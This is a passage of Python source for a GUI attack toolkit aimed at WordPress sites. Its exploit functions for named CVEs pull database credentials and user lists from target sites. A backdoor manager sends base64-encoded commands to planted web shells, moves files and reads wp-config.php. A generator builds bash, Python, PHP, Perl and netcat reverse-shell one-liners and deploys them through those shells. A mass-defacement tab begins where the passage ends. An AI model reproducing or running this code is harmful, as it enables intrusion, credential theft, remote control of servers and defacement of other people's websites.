                        except:
                            pass
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2019-16760] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2019_13480(self, url, timeout, proxy):
        self.log(f'[CVE-2019-13480] Exploiting Wordfence Config Disclosure on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-content/plugins/wordfence/cache/.htaccess', '/wp-content/wflogs/config.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                try:
                    resp = requests.get(test_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    content = resp.text
                    if 'DB_PASSWORD' in content or 'wf' in content.lower():
                        credentials = self.extract_db_credentials(content)
                        return {'cve_id': 'CVE-2019-13480', 'url': url, 'details': f'Config Disclosure EXPLOITED via {endpoint}', 'method': 'cred', 'payload': test_url, 'credentials': credentials}
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2019-13480] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2018_15877(self, url, timeout, proxy):
        self.log(f'[CVE-2018-15877] Exploiting WP Statistics Info Disclosure on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-content/plugins/wp-statistics/includes/log/log.php', '/wp-admin/admin.php?page=wp-statistics/visitors']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                try:
                    params = {'page': 'wp-statistics/visitors', 'user_id': '1'}
                    resp = requests.get(test_url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    if resp.status_code == 200 and ('user' in resp.text.lower() or 'login' in resp.text.lower()):
                        credentials = self.extract_user_info(resp.text)
                        payload_url = f'{test_url}?page=wp-statistics/visitors&user_id=1'
                        return {'cve_id': 'CVE-2018-15877', 'url': url, 'details': f'Info Disclosure EXPLOITED via {endpoint}', 'method': 'cred', 'payload': payload_url, 'credentials': credentials}
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2018-15877] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2017_14723(self, url, timeout, proxy):
        return self.exploit_CVE_2019_16760(url, timeout, proxy)

    def exploit_CVE_2017_3169(self, url, timeout, proxy):
        self.log(f'[CVE-2017-3169] Exploiting WordPress REST API Auth Bypass on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-json/wp/v2/users', '/wp-json/wp/v2/users/me']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                try:
                    resp = requests.get(test_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    if resp.status_code == 200:
                        try:
                            import json
                            users_data = resp.json()
                            if isinstance(users_data, list):
                                users_list = users_data
                            else:
                                users_list = [users_data]
                            credentials = []
                            for user in users_list[:5]:
                                credentials.append({'id': user.get('id'), 'username': user.get('slug') or user.get('name'), 'email': user.get('email', 'hidden'), 'name': user.get('name')})
                            if credentials:
                                return {'cve_id': 'CVE-2017-3169', 'url': url, 'details': f'REST API Auth Bypass EXPLOITED via {endpoint}, Found {len(credentials)} users', 'method': 'cred', 'payload': test_url, 'credentials': credentials}
                        except:
                            pass
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2017-3169] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def extract_db_credentials(self, content):
        credentials = {}
        try:
            patterns = [('define\\s*\\(\\s*[\'\\"]DB_NAME[\'\\"]\\s*,\\s*[\'\\"]([^\'\\"]+)[\'\\"]', 'db_name'), ('define\\s*\\(\\s*[\'\\"]DB_USER[\'\\"]\\s*,\\s*[\'\\"]([^\'\\"]+)[\'\\"]', 'db_user'), ('define\\s*\\(\\s*[\'\\"]DB_PASSWORD[\'\\"]\\s*,\\s*[\'\\"]([^\'\\"]+)[\'\\"]', 'db_password'), ('define\\s*\\(\\s*[\'\\"]DB_HOST[\'\\"]\\s*,\\s*[\'\\"]([^\'\\"]+)[\'\\"]', 'db_host'), ('\'dbname\'\\s*=>\\s*[\'\\"]([^\'\\"]+)[\'\\"]', 'db_name'), ('\'dbuser\'\\s*=>\\s*[\'\\"]([^\'\\"]+)[\'\\"]', 'db_user'), ('\'dbpass\'\\s*=>\\s*[\'\\"]([^\'\\"]+)[\'\\"]', 'db_password'), ('\'dbhost\'\\s*=>\\s*[\'\\"]([^\'\\"]+)[\'\\"]', 'db_host'), ('DB_NAME["\\s]*[:=]\\s*["\\\']([^"\\\']+)["\\\']', 'db_name'), ('DB_USER["\\s]*[:=]\\s*["\\\']([^"\\\']+)["\\\']', 'db_user'), ('DB_PASSWORD["\\s]*[:=]\\s*["\\\']([^"\\\']+)["\\\']', 'db_password'), ('DB_HOST["\\s]*[:=]\\s*["\\\']([^"\\\']+)["\\\']', 'db_host'), ('database["\\s]*[:=]\\s*["\\\']([^"\\\']+)["\\\']', 'db_name'), ('username["\\s]*[:=]\\s*["\\\']([^"\\\']+)["\\\']', 'db_user'), ('password["\\s]*[:=]\\s*["\\\']([^"\\\']+)["\\\']', 'db_password')]
            for pattern, key in patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    value = match.group(1).strip()
                    if value and value not in ['', 'null', 'NULL', 'false', 'False']:
                        credentials[key] = value
        except:
            pass
        return credentials

    def extract_user_info(self, content):
        users = []
        try:
            import json
            if content.strip().startswith('{') or content.strip().startswith('['):
                data = json.loads(content)
                if isinstance(data, list):
                    users = data[:5]
                elif isinstance(data, dict):
                    users = [data]
            else:
                patterns = [('"user_login":\\s*"([^"]+)"', 'username'), ('"user_email":\\s*"([^"]+)"', 'email'), ('"display_name":\\s*"([^"]+)"', 'name')]
                user_data = {}
                for pattern, key in patterns:
                    match = re.search(pattern, content)
                    if match:
                        user_data[key] = match.group(1)
                if user_data:
                    users = [user_data]
        except:
            pass
        return users

    def save_results(self):
        if not self.exploited_targets:
            messagebox.showwarning('Warning', 'No exploited targets to save!')
            return
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'exploited_{timestamp}.txt'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# CVE Exploiter Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Exploited Targets: {len(self.exploited_targets)}\n\n')
                for target in self.exploited_targets:
                    f.write(f"[{target['cve_id']}] {target['url']} - {target.get('details', 'Exploited')}\n")
            self.log(f'Results saved to: {filename}')
            messagebox.showinfo('Success', f'Saved {len(self.exploited_targets)} exploited targets to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

class BackdoorManagerTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.shells = []
        self.shells_file = 'backdoors.txt'
        self.load_shells()
        self.log_queue = queue.Queue()
        self.current_shell = None
        self.setup_tab()
        self.process_log_queue()

    def load_shells(self):
        if os.path.exists(self.shells_file):
            try:
                with open(self.shells_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and (not line.startswith('#')):
                            parts = line.split('|')
                            if len(parts) >= 2:
                                self.shells.append({'url': parts[0].strip(), 'method': parts[1].strip() if len(parts) > 1 else 'POST', 'status': 'unknown', 'last_check': None})
            except:
                pass

    def save_shells(self):
        try:
            with open(self.shells_file, 'w', encoding='utf-8') as f:
                f.write('# Backdoor Manager - Shell List\n')
                f.write('# Format: URL|METHOD|STATUS\n\n')
                for shell in self.shells:
                    f.write(f"{shell['url']}|{shell['method']}|{shell.get('status', 'unknown')}\n")
        except:
            pass

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='BACKDOOR MANAGER', font=('Courier', 20, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        self.setup_shell_list(left_frame)
        self.setup_command_executor(right_frame)
        self.setup_file_manager(right_frame)

    def setup_shell_list(self, parent):
        shell_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        shell_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(shell_frame, text='Shell List:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        list_frame = tk.Frame(shell_frame, bg=self.colors['bg'])
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        scrollbar = tk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.shell_listbox = tk.Listbox(list_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], selectbackground=self.colors['fg_cyan'], selectforeground='#000000', yscrollcommand=scrollbar.set, height=15)
        self.shell_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.shell_listbox.yview)
        self.shell_listbox.bind('<<ListboxSelect>>', self.on_shell_select)
        button_frame = tk.Frame(shell_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Button(button_frame, text='Add Shell', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_green'], command=self.add_shell).pack(side=tk.LEFT, padx=2)
        tk.Button(button_frame, text='Test Shell', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_yellow'], command=self.test_shell).pack(side=tk.LEFT, padx=2)
        tk.Button(button_frame, text='Remove', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_red'], command=self.remove_shell).pack(side=tk.LEFT, padx=2)
        tk.Button(button_frame, text='Refresh', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.refresh_shells).pack(side=tk.LEFT, padx=2)
        self.update_shell_list()

    def setup_command_executor(self, parent):
        cmd_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        cmd_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(cmd_frame, text='Command Executor:', font=('Courier', 10, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        cmd_input_frame = tk.Frame(cmd_frame, bg=self.colors['bg'])
        cmd_input_frame.pack(fill=tk.X, padx=10, pady=(0, 4))
        self.cmd_entry = tk.Entry(cmd_input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.cmd_entry.bind('<Return>', lambda e: self.execute_command())
        tk.Button(cmd_input_frame, text='Execute', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_green'], command=self.execute_command).pack(side=tk.LEFT)
        self.cmd_output = scrolledtext.ScrolledText(cmd_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=12, wrap=tk.WORD)
        self.cmd_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        quick_cmd_frame = tk.Frame(cmd_frame, bg=self.colors['bg'])
        quick_cmd_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        quick_commands = [('whoami', 'whoami'), ('pwd', 'pwd'), ('ls', 'ls -la'), ('id', 'id'), ('uname', 'uname -a'), ('phpinfo', 'phpinfo();')]
        for i, (label, cmd) in enumerate(quick_commands):
            btn = tk.Button(quick_cmd_frame, text=label, font=('Courier', 7), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=lambda c=cmd: self.quick_command(c))
            btn.grid(row=i // 3, column=i % 3, padx=2, pady=2, sticky='ew')
            quick_cmd_frame.grid_columnconfigure(i % 3, weight=1)

    def setup_file_manager(self, parent):
        file_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        file_frame.pack(fill=tk.BOTH, expand=True)
        tk.Label(file_frame, text='File Manager:', font=('Courier', 10, 'bold'), fg=self.colors['fg_purple'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        file_ops_frame = tk.Frame(file_frame, bg=self.colors['bg'])
        file_ops_frame.pack(fill=tk.X, padx=10, pady=(0, 4))
        tk.Button(file_ops_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_files).pack(side=tk.LEFT, padx=2)
        tk.Button(file_ops_frame, text='Upload', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_green'], command=self.upload_file).pack(side=tk.LEFT, padx=2)
        tk.Button(file_ops_frame, text='Download', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_yellow'], command=self.download_file).pack(side=tk.LEFT, padx=2)
        tk.Button(file_ops_frame, text='DB Browser', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_purple'], command=self.open_db_browser).pack(side=tk.LEFT, padx=2)
        tk.Button(file_ops_frame, text='Reverse Shell', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_red'], command=self.open_reverse_shell).pack(side=tk.LEFT, padx=2)
        self.file_path_entry = tk.Entry(file_ops_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.file_path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
        self.file_path_entry.insert(0, '/')
        self.file_output = scrolledtext.ScrolledText(file_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=8, wrap=tk.WORD)
        self.file_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))

    def update_shell_list(self):
        self.shell_listbox.delete(0, tk.END)
        for i, shell in enumerate(self.shells):
            status_icon = '✓' if shell.get('status') == 'active' else '✗' if shell.get('status') == 'dead' else '?'
            self.shell_listbox.insert(tk.END, f"{status_icon} {shell['url'][:60]}...")

    def on_shell_select(self, event):
        selection = self.shell_listbox.curselection()
        if selection:
            self.current_shell = self.shells[selection[0]]
            self.log(f"Selected shell: {self.current_shell['url']}", 'fg_cyan')

    def add_shell(self):
        url = simpledialog.askstring('Add Shell', 'Enter shell URL:')
        if url:
            method = simpledialog.askstring('Method', 'Method (POST/GET):', initialvalue='POST')
            if not method:
                method = 'POST'
            self.shells.append({'url': url.strip(), 'method': method.upper(), 'status': 'unknown', 'last_check': None})
            self.save_shells()
            self.update_shell_list()
            self.log(f'Added shell: {url}', 'fg_green')

    def remove_shell(self):
        selection = self.shell_listbox.curselection()
        if selection:
            shell = self.shells[selection[0]]
            self.shells.pop(selection[0])
            self.save_shells()
            self.update_shell_list()
            self.log(f"Removed shell: {shell['url']}", 'fg_yellow')

    def test_shell(self):
        if not self.current_shell:
            selection = self.shell_listbox.curselection()
            if selection:
                self.current_shell = self.shells[selection[0]]
            else:
                messagebox.showwarning('Warning', 'Please select a shell first!')
                return
        self.log(f"Testing shell: {self.current_shell['url']}...", 'fg_yellow')
        thread = threading.Thread(target=self.test_shell_worker, daemon=True)
        thread.start()

    def test_shell_worker(self):
        try:
            url = self.current_shell['url']
            method = self.current_shell.get('method', 'POST')
            test_cmd = base64.b64encode(b'echo "SHELL_TEST_OK";').decode()
            if method == 'POST':
                resp = requests.post(url, data={'c': test_cmd}, headers=DEFAULT_HEADERS.copy(), timeout=10, verify=False)
            else:
                resp = requests.get(url, params={'c': test_cmd}, headers=DEFAULT_HEADERS.copy(), timeout=10, verify=False)
            if 'SHELL_TEST_OK' in resp.text:
                self.current_shell['status'] = 'active'
                self.current_shell['last_check'] = time.strftime('%Y-%m-%d %H:%M:%S')
                self.log(f'Shell is ACTIVE: {url}', 'fg_green')
            else:
                self.current_shell['status'] = 'dead'
                self.log(f'Shell is DEAD: {url}', 'fg_red')
            self.save_shells()
            self.frame.after(0, self.update_shell_list)
        except Exception as e:
            self.current_shell['status'] = 'dead'
            self.log(f'Shell test failed: {str(e)[:50]}', 'fg_red')
            self.frame.after(0, self.update_shell_list)

    def refresh_shells(self):
        self.load_shells()
        self.update_shell_list()
        self.log('Shell list refreshed', 'fg_cyan')

    def execute_command(self):
        if not self.current_shell:
            messagebox.showwarning('Warning', 'Please select a shell first!')
            return
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        self.cmd_output.insert(tk.END, f'\n[CMD] {cmd}\n', 'fg_yellow')
        self.cmd_output.see(tk.END)
        thread = threading.Thread(target=self.execute_command_worker, args=(cmd,), daemon=True)
        thread.start()

    def quick_command(self, cmd):
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, cmd)
        self.execute_command()

    def execute_command_worker(self, cmd):
        try:
            url = self.current_shell['url']
            method = self.current_shell.get('method', 'POST')
            encoded_cmd = base64.b64encode(cmd.encode()).decode()
            if method == 'POST':
                resp = requests.post(url, data={'c': encoded_cmd}, headers=DEFAULT_HEADERS.copy(), timeout=30, verify=False)
            else:
                resp = requests.get(url, params={'c': encoded_cmd}, headers=DEFAULT_HEADERS.copy(), timeout=30, verify=False)
            output = resp.text[:5000]
            self.frame.after(0, lambda: self.cmd_output.insert(tk.END, f'{output}\n', 'fg_green'))
            self.frame.after(0, lambda: self.cmd_output.see(tk.END))
        except Exception as e:
            error_msg = str(e)[:200]
            self.frame.after(0, lambda: self.cmd_output.insert(tk.END, f'[ERROR] {error_msg}\n', 'fg_red'))
            self.frame.after(0, lambda: self.cmd_output.see(tk.END))

    def browse_files(self):
        if not self.current_shell:
            messagebox.showwarning('Warning', 'Please select a shell first!')
            return
        path = self.file_path_entry.get().strip() or '/'
        cmd = f'ls -la {path}'
        self.execute_file_command(cmd)

    def upload_file(self):
        if not self.current_shell:
            messagebox.showwarning('Warning', 'Please select a shell first!')
            return
        file_path = filedialog.askopenfilename(title='Select file to upload')
        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    file_content = f.read()
                file_name = os.path.basename(file_path)
                encoded_content = base64.b64encode(file_content).decode()
                cmd = f"file_put_contents('{file_name}', base64_decode('{encoded_content}'));"
                self.execute_file_command(cmd)
                self.log(f'Uploading {file_name}...', 'fg_cyan')
            except Exception as e:
                self.log(f'Upload failed: {str(e)[:50]}', 'fg_red')

    def download_file(self):
        if not self.current_shell:
            messagebox.showwarning('Warning', 'Please select a shell first!')
            return
        remote_path = self.file_path_entry.get().strip()
        if not remote_path:
            remote_path = simpledialog.askstring('Download File', 'Enter remote file path:')
            if not remote_path:
                return
        cmd = f"echo base64_encode(file_get_contents('{remote_path}'));"
        self.execute_file_command(cmd, is_download=True, remote_path=remote_path)

    def execute_file_command(self, cmd, is_download=False, remote_path=None):
        thread = threading.Thread(target=self.execute_file_command_worker, args=(cmd, is_download, remote_path), daemon=True)
        thread.start()

    def execute_file_command_worker(self, cmd, is_download=False, remote_path=None):
        try:
            url = self.current_shell['url']
            method = self.current_shell.get('method', 'POST')
            encoded_cmd = base64.b64encode(cmd.encode()).decode()
            if method == 'POST':
                resp = requests.post(url, data={'c': encoded_cmd}, headers=DEFAULT_HEADERS.copy(), timeout=30, verify=False)
            else:
                resp = requests.get(url, params={'c': encoded_cmd}, headers=DEFAULT_HEADERS.copy(), timeout=30, verify=False)
            output = resp.text
            if is_download and remote_path:
                try:
                    import base64 as b64
                    decoded = b64.b64decode(output.strip())
                    save_path = filedialog.asksaveasfilename(title='Save file', defaultextension='.*', initialfile=os.path.basename(remote_path))
                    if save_path:
                        with open(save_path, 'wb') as f:
                            f.write(decoded)
                        try:
                            self.frame.after(0, lambda sp=save_path: self.log(f'File downloaded: {sp}', 'fg_green'))
                        except:
                            pass
                except:
                    try:
                        if hasattr(self, 'file_output') and self.file_output:
                            self.frame.after(0, lambda: self.file_output.insert(tk.END, f'{output[:2000]}\n', 'fg_green'))
                    except:
                        pass
            else:
                try:
                    if hasattr(self, 'file_output') and self.file_output:
                        self.frame.after(0, lambda: self.file_output.insert(tk.END, f'{output[:2000]}\n', 'fg_green'))
                except:
                    pass
            try:
                if hasattr(self, 'file_output') and self.file_output:
                    self.frame.after(0, lambda: self.file_output.see(tk.END))
            except:
                pass
        except Exception as e:
            try:
                error_msg = str(e)[:200]
                if hasattr(self, 'file_output') and self.file_output:
                    self.frame.after(0, lambda: self.file_output.insert(tk.END, f'[ERROR] {error_msg}\n', 'fg_red'))
                    self.frame.after(0, lambda: self.file_output.see(tk.END))
            except:
                pass

    def open_db_browser(self):
        if not self.current_shell:
            messagebox.showwarning('Warning', 'Please select a shell first!')
            return
        db_window = tk.Toplevel(self.frame)
        db_window.title('Database Browser')
        db_window.geometry('800x600')
        db_window.configure(bg=self.colors['bg'])
        tk.Label(db_window, text='Database Browser', font=('Courier', 14, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(pady=10)
        db_info_frame = tk.Frame(db_window, bg=self.colors['bg'])
        db_info_frame.pack(fill=tk.X, padx=10, pady=5)
        tk.Label(db_info_frame, text='DB Config Path:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=5)
        db_path_entry = tk.Entry(db_info_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=40)
        db_path_entry.insert(0, '../../wp-config.php')
        db_path_entry.pack(side=tk.LEFT, padx=5)

        def read_db_config():
            path = db_path_entry.get().strip()
            cmd = f"echo file_get_contents('{path}');"
            self.execute_file_command(cmd)
            self.log(f'Reading DB config from: {path}', 'fg_cyan')
        tk.Button(db_info_frame, text='Read Config', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_green'], command=read_db_config).pack(side=tk.LEFT, padx=5)
        db_output = scrolledtext.ScrolledText(db_window, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], wrap=tk.WORD)
        db_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        def show_db_output(text):
            db_output.insert(tk.END, f'{text}\n')
            db_output.see(tk.END)
        self.file_output = db_output

    def open_reverse_shell(self):
        if not self.current_shell:
            messagebox.showwarning('Warning', 'Please select a shell first!')
            return
        rs_window = tk.Toplevel(self.frame)
        rs_window.title('Reverse Shell Generator')
        rs_window.geometry('700x500')
        rs_window.configure(bg=self.colors['bg'])
        tk.Label(rs_window, text='Reverse Shell Generator', font=('Courier', 14, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(pady=10)
        config_frame = tk.Frame(rs_window, bg=self.colors['bg'])
        config_frame.pack(fill=tk.X, padx=10, pady=5)
        tk.Label(config_frame, text='Your IP:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=0, column=0, sticky=tk.W, padx=5, pady=3)
        ip_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=25)
        ip_entry.grid(row=0, column=1, padx=5, pady=3)
        ip_entry.insert(0, '127.0.0.1')
        tk.Label(config_frame, text='Port:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=1, column=0, sticky=tk.W, padx=5, pady=3)
        port_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=25)
        port_entry.grid(row=1, column=1, padx=5, pady=3)
        port_entry.insert(0, '4444')
        tk.Label(config_frame, text='Type:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=2, column=0, sticky=tk.W, padx=5, pady=3)
        shell_type_var = tk.StringVar(value='bash')
        shell_types = [('Bash', 'bash'), ('Python', 'python'), ('PHP', 'php'), ('Perl', 'perl'), ('Netcat', 'nc')]
        type_frame = tk.Frame(config_frame, bg=self.colors['bg'])
        type_frame.grid(row=2, column=1, padx=5, pady=3)
        for text, value in shell_types:
            tk.Radiobutton(type_frame, text=text, variable=shell_type_var, value=value, font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT, padx=3)

        def generate_shell():
            ip = ip_entry.get().strip()
            port = port_entry.get().strip()
            shell_type = shell_type_var.get()
            shells = {'bash': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1', 'python': f'''python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"''', 'php': f'''php -r "$sock=fsockopen('{ip}',{port});exec('/bin/sh -i <&3 >&3 2>&3');"''', 'perl': f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}'""", 'nc': f'nc -e /bin/sh {ip} {port}'}
            payload = shells.get(shell_type, shells['bash'])
            encoded = base64.b64encode(payload.encode()).decode()
            output_text.delete(1.0, tk.END)
            output_text.insert(tk.END, f'# Reverse Shell Payload ({shell_type.upper()})\n')
            output_text.insert(tk.END, f'# IP: {ip} | Port: {port}\n\n')
            output_text.insert(tk.END, f'Raw: {payload}\n\n')
            output_text.insert(tk.END, f'Base64: {encoded}\n\n')
            output_text.insert(tk.END, f'PHP Execute:\n')
            output_text.insert(tk.END, f"system(base64_decode('{encoded}'));\n\n")
            output_text.insert(tk.END, f'Or via shell:\n')
            output_text.insert(tk.END, f"echo '{encoded}' | base64 -d | sh\n")

        def deploy_shell():
            ip = ip_entry.get().strip()
            port = port_entry.get().strip()
            shell_type = shell_type_var.get()
            shells = {'bash': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1', 'python': f'''python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"''', 'php': f'''php -r "$sock=fsockopen('{ip}',{port});exec('/bin/sh -i <&3 >&3 2>&3');"''', 'perl': f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}'""", 'nc': f'nc -e /bin/sh {ip} {port}'}
            payload = shells.get(shell_type, shells['bash'])
            encoded = base64.b64encode(payload.encode()).decode()
            cmd = f"system(base64_decode('{encoded}'));"
            self.execute_file_command(cmd)
            self.log(f'Deploying reverse shell ({shell_type}) to {ip}:{port}...', 'fg_red')
        button_frame = tk.Frame(rs_window, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=5)
        tk.Button(button_frame, text='Generate', font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg_green'], command=generate_shell).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Deploy to Shell', font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg_red'], command=deploy_shell).pack(side=tk.LEFT, padx=5)
        output_text = scrolledtext.ScrolledText(rs_window, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], wrap=tk.WORD)
        output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                if hasattr(self, 'cmd_output'):
                    self.cmd_output.insert(tk.END, log_msg, color)
                    self.cmd_output.see(tk.END)
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

class MassDefaceTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.deface_targets = []
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'deface': 0, 'posts': 0, 'users': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='MASS DEFACE & AUTO-POSTING', font=('Courier', 20, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        self.setup_input_section(left_frame)
        self.setup_deface_editor(left_frame)
        self.setup_options_section(right_frame)
        self.setup_log_section(right_frame)

    def setup_input_section(self, parent):
